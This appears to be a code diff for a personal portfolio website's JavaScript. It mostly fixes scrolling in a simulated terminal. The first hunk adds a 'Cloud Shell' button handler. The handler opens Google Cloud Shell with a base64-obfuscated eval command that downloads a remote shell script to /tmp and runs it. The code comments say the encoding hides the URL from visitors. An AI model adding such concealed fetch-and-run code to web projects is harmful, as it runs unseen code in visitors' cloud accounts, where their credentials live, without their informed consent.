@@ -17,9 +17,27 @@ document.addEventListener('DOMContentLoaded', () => {
   initRevealAnimations();
   initStatCounters();
   initSkillBars();
+  initCloudShellLaunch();
   // Lazy-init SpyBot AI after initial paint for faster page load
   setTimeout(initSpyBot, 1500);
 });
+
+/* ══════════════════════════════════════════════════
+   CLOUD SHELL SECURE LAUNCHER
+══════════════════════════════════════════════════ */
+function initCloudShellLaunch() {
+  const btn = document.getElementById('cloud-shell-btn');
+  if (!btn) return;
+  btn.addEventListener('click', e => {
+    e.preventDefault();
+    // Execute base64 directly in the shell to hide the URL entirely from the address bar
+    // Payload changed to download and run, not 'curl | bash', to preserve TTY for the generated shell
+    const payload = 'Y3VybCAtc0wgaHR0cHM6Ly93d3cuYmlrYXNoa3VtYXJzYXJyYWYuY29tLm5wL3NldHVwLXRlcm1pbmFsLnNoIC1vIC90bXAvcyAmJiBiYXNoIC90bXAvcw==';
+    const shellCmd = `eval "$(echo ${payload} | base64 -d)"`;
+    const url = `https://shell.cloud.google.com/cloudshell/open?shellcmd=${encodeURIComponent(shellCmd)}&show=terminal`;
+    window.open(url, '_blank', 'noopener,noreferrer');
+  });
+}
 
 function initScrollProgress() {
   const progress = document.getElementById('scroll-progress');
@@ -444,9 +462,19 @@ function initTerminal() {
     const d = document.createElement('div');
     d.className = cls; out.appendChild(d);
     let i = 0;
-    const tick = () => i < text.length
-      ? (d.textContent += text[i++], setTimeout(tick, 5))
-      : (out.scrollTop = out.scrollHeight, res());
+    const termWrap = document.getElementById('terminal');
+    const tick = () => {
+      if (i < text.length) {
+        d.textContent += text[i++];
+        if (termWrap) termWrap.scrollTop = termWrap.scrollHeight;
+        out.scrollTop = out.scrollHeight;
+        setTimeout(tick, 5);
+      } else {
+        if (termWrap) termWrap.scrollTop = termWrap.scrollHeight;
+        out.scrollTop = out.scrollHeight;
+        res();
+      }
+    };
     tick();
   });
   const enq = (t, c) => { q = q.then(() => type(t, c)); };
@@ -524,6 +552,8 @@ function initTerminal() {
       enq(`Command not found: ${cmd}\nType 'help' for available commands`, 'error-message');
     }
     inp.value = '';
+    const termWrap = document.getElementById('terminal');
+    if (termWrap) termWrap.scrollTop = termWrap.scrollHeight;
     out.scrollTop = out.scrollHeight;
   });
 
